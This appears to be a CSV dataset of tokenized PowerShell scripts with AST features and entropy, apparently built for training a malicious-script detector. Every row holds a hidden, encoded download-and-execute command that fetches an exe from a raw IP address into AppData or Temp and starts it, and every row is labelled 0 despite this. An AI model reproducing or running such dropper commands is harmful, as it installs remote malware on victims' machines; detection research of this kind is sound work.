new_parameters,source_code,ast,node_type_statistics,ast_deep,ast_total,ast_width,entropy,label
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 137 rama jusch exe env temp jusch exe start process env temp jusch exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden juschedexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494137ramajuschedexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess juschedexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.22901,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 89 248 166 140 zebra iesecv exe env appdata scvkem exe start process env appdata scvkem exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248166140zebraiesecvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.76435,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
executionpolicy bypass windowstyle hidden enc,new object system net webclient downloadfil http 185 141 27 35 updat exe env temp filex8611 exe start process env temp filex8611 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http1851412735updateexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.68149,0
